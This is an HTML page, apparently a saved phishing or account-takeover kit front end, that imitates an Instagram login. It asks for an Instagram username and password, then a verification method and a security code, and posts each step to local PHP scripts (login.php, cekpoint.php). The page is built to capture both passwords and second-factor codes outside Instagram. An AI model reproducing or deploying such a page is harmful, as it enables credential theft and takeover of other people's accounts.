<html>

<head>
<title>Login Instagram</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  
  <!-- Google Tag Manager -->
  <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
  <script type="text/javascript" defer="" async="" src="https://track.uc.cn/uaest.js"></script>
  <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-NKDMSK6"></script>
  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-NKDMSK6');</script>
  <!-- End Google Tag Manager -->
  <!-- Favicon -->
  <link href="assets/img/brand/favicon.png" rel="icon" type="image/png">
  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700" rel="stylesheet">
  <!-- Icons -->
  <link href="assets/vendor/nucleo/css/nucleo.css" rel="stylesheet">
  <link href="assets/vendor/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
  <!-- Argon CSS -->
  <link type="text/css" href="assets/css/argon.min.css?v=1.0.0" rel="stylesheet">
  <style>@font-face{font-family:uc-nexus-iconfont;src:url(chrome-extension://pogijhnlcfmcppgimcaccdkmbedjkmhi/res/font_9qmmi8b8jsxxbt9.woff) format('woff'),url(chrome-extension://pogijhnlcfmcppgimcaccdkmbedjkmhi/res/font_9qmmi8b8jsxxbt9.ttf) format('truetype')}</style>
</head>

<body class="bg-default">
  <!-- Google Tag Manager (noscript) -->
  <noscript>&lt;iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NKDMSK6" height="0" width="0"
    style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
  <!-- End Google Tag Manager (noscript) -->
  <div class="main-content">
    <!-- Navbar -->

    <!-- Header -->
    <div class="header bg-gradient-primary py-7 py-lg-8">
      <div class="container">

      </div>
      <div class="separator separator-bottom separator-skew zindex-100">
        <svg x="0" y="0" viewBox="0 0 2560 100" preserveAspectRatio="none" version="1.1" xmlns="http://www.w3.org/2000/svg">
          <polygon class="fill-default" points="2560 0 2560 100 0 100"></polygon>
        </svg>
      </div>
    </div>
    <!-- Page content -->
    <div class="container mt--8 pb-5">
      <div class="row justify-content-center">
        <div class="col-lg-5 col-md-7">
        <div id="status"></div>
          <div class="card bg-secondary shadow border-0">
            <div class="card-header bg-transparent pb-3">

              <div class="btn-wrapper text-center">
                

              </div>
            </div>
            <div class="card-body px-lg-5 py-lg-5">

              <form role="form" method="POST" id="login">
                <div class="form-group mb-3">
                  <div class="input-group input-group-alternative">
                    <div class="input-group-prepend">
                      <span class="input-group-text"><i class="fa fa-user"></i></span>
                    </div>
                    <input class="form-control pl-2" name="username" placeholder="Username Instagram" type="text">
                  </div>
                </div>
                <div class="form-group">
                  <div class="input-group input-group-alternative">
                    <div class="input-group-prepend">
                      <span class="input-group-text"><i class="ni ni-lock-circle-open"></i></span>
                    </div>
                    <input class="form-control pl-2" name="password" placeholder="Password Instagram" type="password">
                  </div>
                </div>

                <div class="text-center">
                  <button type="button" id="btn-login" class="btn btn-primary my-4">Sign in</button>
                </div>
              </form>
              <form role="form" method="POST" id="login-cekpoint-1">
                <input type="hidden" id="langkah_1" name="langkah_1" placeholder="" value="1">
                  <div class="form-group mb-3">
                    <div class="input-group input-group-alternative">
                      <div class="input-group-prepend">
                        <span class="input-group-text"><i class="fa fa-list"></i></span>
                      </div>
                      <select class="form-control" name="verifikasi" id="verifikasi">
                          <option value="999">Choose Verification Method</option>
                          <option value="1">Email</option>
                          <option value="0">Phone Number</option>
                      </select>
                    </div>
                  </div>
                
                <div class="text-center">
                  <button type="button" id="btn-login-cekpoint-1" class="btn btn-primary my-4">Next Step</button>
                </div>
              </form>
              <form role="form" method="POST" id="login-cekpoint-2">
                <input type="hidden" id="langkah_2" name="langkah_2" placeholder="" value="1">
                  <div class="form-group mb-3">
                    <div class="input-group input-group-alternative">
                      <div class="input-group-prepend">
                        <span class="input-group-text"><i class="fa fa-envelope"></i></span>
                      </div>
                      <input class="form-control pl-2" name="security_code" id="security_code" placeholder="Verification code" type="text">
                    </div>
                  </div>
                
                <div class="text-center">
                  <button type="button" id="btn-login-cekpoint-2" class="btn btn-primary my-4">Verify</button>
                </div>
              </form>
            </div>
          </div>
          <div class="row mt-3">


          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- Footer -->

  <!-- Argon Scripts -->
  <!-- Core -->
  <script src="assets/vendor/jquery/dist/jquery.min.js"></script>
  <script src="assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
  <!-- Argon JS -->
  <script src="assets/js/argon.min.js?v=1.0.0"></script>
  <script type="text/javascript">
  $('#login').css('display', 'block');
  $('#login-cekpoint-1').css('display', 'none');
  $('#login-cekpoint-2').css('display', 'none');
    $('#btn-login').click(function () {
      $("form#login").text(function () {
        var pdata = $(this).serialize();
        var purl = 'action/login.php';
        $.ajax({
          url: purl,
          data: pdata,
          timeout: false,
          type: 'POST',
          dataType: 'JSON',
          success: function (hasil) {
            $("input").removeAttr("disabled", "disabled");
            $("button").removeAttr("disabled", "disabled");
            $("#btn-login").html('Sign In');
            if (hasil.result) {
              $("#status").html(hasil.content);

            } else
              if(hasil.cekpoint == 1){
                      $('#login').css('display', 'none');
                      $('#login-cekpoint-1').css('display', 'block');
                      $('#login-cekpoint-2').css('display', 'none');
              }
              $("#status").html(hasil.content);
          },
          error: function (a, b, c) {
            $("input").removeAttr("disabled", "disabled");
            $("button").removeAttr("disabled", "disabled");
            $("#btn-login").html('Sign In');
            $("#status").text(c);
          },
          beforeSend: function () {
            $("input").attr("disabled", "disabled");
            $("#btn-login").html('PROSESS..');
            $("button").attr("disabled", "disabled");
          }
        });

      });
    });
    $('#btn-login-cekpoint-1').click(function () {
      $("form#login-cekpoint-1").text(function () {
        var pdata = $(this).serialize();
        var purl = 'action/cekpoint.php';
        $.ajax({
          url: purl,
          data: pdata,
          timeout: false,
          type: 'POST',
          dataType: 'JSON',
          success: function (hasil) {
            $("input").removeAttr("disabled", "disabled");
            $("button").removeAttr("disabled", "disabled");
            $("#btn-login-cekpoint-1").html('Next Step');
            if(hasil.result == true){
              //window.location.replace(hasil.redirect);
              $("#status").html(hasil.content);
              $('#login').css('display', 'none');
              $('#login-cekpoint-1').css('display', 'none');
              $('#login-cekpoint-2').css('display', 'block');
            } else
              $("#status").html(hasil.content);
          },
          error: function (a, b, c) {
            $("input").removeAttr("disabled", "disabled");
            $("button").removeAttr("disabled", "disabled");
            $("#btn-login-cekpoint-1").html('Next Step');
            $("#status").text(c);
          },
          beforeSend: function () {
            $("input").attr("disabled", "disabled");
            $("#btn-login-cekpoint-1").html('PROSESS..');
            $("button").attr("disabled", "disabled");
          }
        });

      });
    });
    $('#btn-login-cekpoint-2').click(function () {
      $("form#login-cekpoint-2").text(function () {
        var pdata = $(this).serialize();
        var purl = 'action/cekpoint.php';
        $.ajax({
          url: purl,
          data: pdata,
          timeout: false,
          type: 'POST',
          dataType: 'JSON',
          success: function (hasil) {
            $("input").removeAttr("disabled", "disabled");
            $("button").removeAttr("disabled", "disabled");
            $("#btn-login-cekpoint-2").html('Next Step');
            if(hasil.result == true){
              $("#status").html(hasil.content);

            } else
              $("#status").html(hasil.content);
          },
          error: function (a, b, c) {
            $("input").removeAttr("disabled", "disabled");
            $("button").removeAttr("disabled", "disabled");
            $("#btn-login-cekpoint-2").html('Next Step');
            $("#status").text(c);
          },
          beforeSend: function () {
            $("input").attr("disabled", "disabled");
            $("#btn-login-cekpoint-2").html('PROSESS..');
            $("button").attr("disabled", "disabled");
          }
        });

      });
    });
  </script>

</body>

</html>